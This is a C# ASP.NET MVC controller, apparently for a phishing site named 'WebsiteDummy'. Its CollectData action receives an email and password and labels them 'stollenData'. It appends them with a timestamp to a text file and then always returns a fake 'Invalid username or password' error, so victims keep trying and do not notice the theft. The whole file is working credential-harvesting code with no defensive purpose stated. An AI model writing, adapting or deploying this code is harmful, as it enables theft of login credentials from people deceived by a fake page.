using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Web;
using System.Web.Hosting;
using System.Web.Mvc;

namespace WebsiteDummy.Controllers
{
	public class HomeController : Controller
	{
		public ActionResult Index()
		{

			return View();
		}

		[HttpPost]
		public ActionResult CollectData(string email, string password)
		{
			string stollenData = email + ";" + password + ";" + DateTime.Now.ToString();

			string path = HostingEnvironment.MapPath("~/App_Data/database.txt");
			FileStream stream = new FileStream(path, FileMode.Append);
			


			using (StreamWriter sw = new StreamWriter(stream))
			{
				sw.WriteLine(stollenData);
			}


			ViewBag.error = "Invalid username or password";
			return View("Index");
		}


	}
}